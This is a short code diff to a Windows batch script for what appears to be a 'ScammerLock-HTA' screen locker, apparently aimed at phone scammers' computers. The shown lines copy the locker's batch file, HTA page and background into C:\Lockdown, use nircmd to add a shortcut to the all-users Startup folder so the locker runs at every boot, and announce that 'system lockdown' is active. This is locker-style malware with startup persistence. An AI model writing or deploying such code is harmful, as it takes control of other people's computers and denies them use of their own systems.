@@ -7,10 +7,10 @@ if exist "C:\Lockdown" (
 )
 
 mkdir C:\Lockdown
-copy %0 C:\Lockdown > nul
+copy ldstartup.bat C:\Lockdown > nul
 copy index.hta C:\Lockdown > nul
 copy background.png C:\Lockdown > nul
-nircmd.exe shortcut "C:\Lockdown\lockdown.bat" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" "ScammerLock-HTA"
+nircmd.exe shortcut "C:\Lockdown\ldstartup.bat" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" "ScammerLock-HTA"
 
 echo Initiating system lockdown...
 echo Lockdown mode is now active.
